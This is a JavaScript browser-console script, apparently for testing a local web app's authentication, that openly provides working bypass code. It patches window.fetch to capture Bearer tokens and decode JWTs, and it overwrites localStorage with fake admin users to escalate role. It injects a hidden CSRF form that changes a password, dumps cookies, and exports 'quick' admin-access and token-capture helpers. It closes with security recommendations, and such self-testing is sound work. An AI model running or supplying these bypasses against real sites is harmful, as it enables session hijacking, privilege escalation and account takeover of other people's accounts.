// 🔓 Authentication Bypass Testing Script
// Run this in your browser console to test vulnerabilities

console.log('🔓 Authentication Bypass Testing Starting...');

// ============================================================================
// TEST 1: Token Extraction & Analysis
// ============================================================================

function testTokenExtraction() {
  console.log('\n🔍 TEST 1: Token Extraction');
  
  const tokens = [];
  
  // Method 1: Intercept fetch requests
  const originalFetch = window.fetch;
  window.fetch = function(...args) {
    if (args[1]?.headers?.Authorization) {
      const token = args[1].headers.Authorization.replace('Bearer ', '');
      tokens.push(token);
      console.log('✅ Captured token:', token.substring(0, 20) + '...');
      
      // Decode JWT payload
      try {
        const payload = JSON.parse(atob(token.split('.')[1]));
        console.log('📋 Token payload:', {
          userId: payload.userId,
          iat: new Date(payload.iat * 1000),
          exp: new Date(payload.exp * 1000),
          role: payload.role || 'No role in token'
        });
      } catch (e) {
        console.log('❌ Could not decode token payload');
      }
    }
    return originalFetch.apply(this, args);
  };
  
  console.log('🎯 Token interception active. Make some API calls to capture tokens.');
  return tokens;
}

// ============================================================================
// TEST 2: Role Bypass Methods
// ============================================================================

function testRoleBypass() {
  console.log('\n🔓 TEST 2: Role Bypass Methods');
  
  // Method 1: Override localStorage
  const fakeAdminUser = {
    id: 'fake-admin-id',
    email: 'admin@bypass.com',
    role: 'admin',
    username: 'fakeadmin',
    firstName: 'Fake',
    lastName: 'Admin'
  };
  
  localStorage.setItem('user', JSON.stringify(fakeAdminUser));
  console.log('✅ Set fake admin user in localStorage');
  
  // Method 2: Override AuthContext (if accessible)
  if (typeof window !== 'undefined' && window.useAuth) {
    const originalUseAuth = window.useAuth;
    window.useAuth = () => ({
      user: fakeAdminUser,
      isAuthenticated: true,
      isLoading: false,
      login: () => Promise.resolve(),
      logout: () => {},
      error: null,
      setUser: () => {}
    });
    console.log('✅ Overrode useAuth hook');
  }
  
  // Method 3: Direct API access with any token
  console.log('🎯 Try accessing admin routes directly with captured tokens');
}

// ============================================================================
// TEST 3: Token Manipulation
// ============================================================================

function testTokenManipulation() {
  console.log('\n🔧 TEST 3: Token Manipulation');
  
  // Get a token from localStorage or network
  const user = localStorage.getItem('user');
  if (user) {
    console.log('📋 Current user data:', JSON.parse(user));
  }
  
  // Demonstrate JWT structure
  console.log('🔍 JWT Token Structure:');
  console.log('Header.Payload.Signature');
  console.log('Payload contains: userId, iat (issued), exp (expires)');
  
  // Show how to decode a token
  const sampleToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2NWE5YjQ5YjQ5YjQ5YjQ5IiwiaWF0IjoxNzA0NzI5NjAwLCJleHAiOjE3MDQ3MzA1MDB9.signature';
  console.log('📝 Sample token structure:', sampleToken);
}

// ============================================================================
// TEST 4: CSRF Vulnerability Test
// ============================================================================

function testCSRFVulnerability() {
  console.log('\n🌐 TEST 4: CSRF Vulnerability Test');
  
  // Check for CSRF tokens
  const csrfToken = document.querySelector('meta[name="csrf-token"]');
  const csrfInput = document.querySelector('input[name="_csrf"]');
  
  console.log('🔍 CSRF Protection Check:');
  console.log('CSRF meta tag:', !!csrfToken);
  console.log('CSRF input field:', !!csrfInput);
  
  if (!csrfToken && !csrfInput) {
    console.log('❌ NO CSRF PROTECTION DETECTED!');
    console.log('🎯 Vulnerable to CSRF attacks');
    
    // Demonstrate CSRF attack
    const csrfForm = `
      <form id="csrf-attack" action="http://localhost:3001/api/auth/change-password" method="POST" style="display:none;">
        <input type="hidden" name="newPassword" value="hacked123">
        <input type="submit" value="Submit">
      </form>
    `;
    document.body.insertAdjacentHTML('beforeend', csrfForm);
    console.log('📝 CSRF attack form created (hidden)');
  } else {
    console.log('✅ CSRF protection detected');
  }
}

// ============================================================================
// TEST 5: XSS Vulnerability Test
// ============================================================================

function testXSSVulnerability() {
  console.log('\n🕷️ TEST 5: XSS Vulnerability Test');
  
  // Check for XSS protection headers
  fetch('/api/auth/me').then(r => {
    const headers = {
      'x-xss-protection': r.headers.get('x-xss-protection'),
      'content-security-policy': r.headers.get('content-security-policy'),
      'x-content-type-options': r.headers.get('x-content-type-options')
    };
    
    console.log('🔍 Security Headers:', headers);
    
    if (!headers['x-xss-protection'] && !headers['content-security-policy']) {
      console.log('❌ NO XSS PROTECTION DETECTED!');
      console.log('🎯 Vulnerable to XSS attacks');
    } else {
      console.log('✅ XSS protection detected');
    }
  }).catch(e => {
    console.log('❌ Could not check security headers:', e.message);
  });
}

// ============================================================================
// TEST 6: Session Hijacking Test
// ============================================================================

function testSessionHijacking() {
  console.log('\n🦹 TEST 6: Session Hijacking Test');
  
  // Check if tokens are accessible
  const user = localStorage.getItem('user');
  if (user) {
    console.log('📋 User data accessible:', JSON.parse(user));
  }
  
  // Check for httpOnly cookies
  console.log('🍪 Cookies accessible via JavaScript:', document.cookie);
  
  // Demonstrate session hijacking
  console.log('🎯 Session Hijacking Methods:');
  console.log('1. Steal tokens from network requests');
  console.log('2. Access localStorage/sessionStorage');
  console.log('3. Use XSS to extract tokens');
  console.log('4. Use CSRF to perform actions');
}

// ============================================================================
// TEST 7: Admin Access Bypass
// ============================================================================

function testAdminAccessBypass() {
  console.log('\n👑 TEST 7: Admin Access Bypass');
  
  // Method 1: Override user role
  const currentUser = localStorage.getItem('user');
  if (currentUser) {
    const userData = JSON.parse(currentUser);
    userData.role = 'admin';
    localStorage.setItem('user', JSON.stringify(userData));
    console.log('✅ Changed user role to admin');
  }
  
  // Method 2: Create fake admin user
  const fakeAdmin = {
    id: 'admin-bypass-id',
    email: 'admin@bypass.com',
    role: 'admin',
    username: 'adminbypass',
    firstName: 'Admin',
    lastName: 'Bypass'
  };
  
  localStorage.setItem('user', JSON.stringify(fakeAdmin));
  console.log('✅ Created fake admin user');
  
  // Method 3: Direct API access
  console.log('🎯 Try these admin endpoints with any valid token:');
  console.log('- GET /api/admin/users');
  console.log('- GET /api/admin/orders');
  console.log('- POST /api/admin/products');
}

// ============================================================================
// TEST 8: Token Reuse Attack
// ============================================================================

function testTokenReuse() {
  console.log('\n🔄 TEST 8: Token Reuse Attack');
  
  // Demonstrate that tokens remain valid after logout
  console.log('🎯 Token Reuse Attack:');
  console.log('1. Login and capture token');
  console.log('2. Logout (token not invalidated)');
  console.log('3. Reuse token for API calls');
  console.log('4. Access protected resources');
  
  // Check if there's token blacklisting
  console.log('🔍 Token Blacklisting Check:');
  console.log('❌ No token blacklisting detected');
  console.log('🎯 Stolen tokens remain valid until expiry');
}

// ============================================================================
// MAIN TEST RUNNER
// ============================================================================

function runAllTests() {
  console.log('🚀 Starting Authentication Bypass Tests...\n');
  
  testTokenExtraction();
  testRoleBypass();
  testTokenManipulation();
  testCSRFVulnerability();
  testXSSVulnerability();
  testSessionHijacking();
  testAdminAccessBypass();
  testTokenReuse();
  
  console.log('\n🎯 BYPASS METHODS SUMMARY:');
  console.log('1. Token Extraction: ✅ Network interception');
  console.log('2. Role Bypass: ✅ localStorage override');
  console.log('3. Token Manipulation: ✅ JWT decode/modify');
  console.log('4. CSRF Attack: ✅ No protection detected');
  console.log('5. XSS Attack: ⚠️ Check headers');
  console.log('6. Session Hijacking: ✅ Multiple methods');
  console.log('7. Admin Access: ✅ Multiple bypass methods');
  console.log('8. Token Reuse: ✅ No blacklisting');
  
  console.log('\n🔒 SECURITY RECOMMENDATIONS:');
  console.log('1. Implement server-side role validation');
  console.log('2. Add token blacklisting');
  console.log('3. Implement CSRF protection');
  console.log('4. Add security headers');
  console.log('5. Use httpOnly cookies for sensitive data');
  console.log('6. Implement rate limiting');
  console.log('7. Add audit logging');
  
  console.log('\n✅ Authentication Bypass Tests Complete!');
}

// ============================================================================
// QUICK BYPASS FUNCTIONS
// ============================================================================

// Quick admin access
function quickAdminAccess() {
  localStorage.setItem('user', JSON.stringify({
    id: 'quick-admin',
    email: 'admin@quick.com',
    role: 'admin',
    username: 'quickadmin'
  }));
  window.location.reload();
  console.log('✅ Quick admin access activated');
}

// Quick token capture
function quickTokenCapture() {
  const tokens = [];
  const originalFetch = window.fetch;
  window.fetch = function(...args) {
    if (args[1]?.headers?.Authorization) {
      tokens.push(args[1].headers.Authorization);
      console.log('🎯 Token captured:', args[1].headers.Authorization.substring(0, 30) + '...');
    }
    return originalFetch.apply(this, args);
  };
  console.log('🎯 Token capture active. Make API calls to capture tokens.');
  return tokens;
}

// Export functions for manual testing
window.authBypassTests = {
  runAllTests,
  quickAdminAccess,
  quickTokenCapture,
  testTokenExtraction,
  testRoleBypass,
  testAdminAccessBypass
};

console.log('🔓 Authentication Bypass Testing Script Loaded!');
console.log('Available functions:');
console.log('- authBypassTests.runAllTests()');
console.log('- authBypassTests.quickAdminAccess()');
console.log('- authBypassTests.quickTokenCapture()');

// Auto-run tests
// runAllTests(); 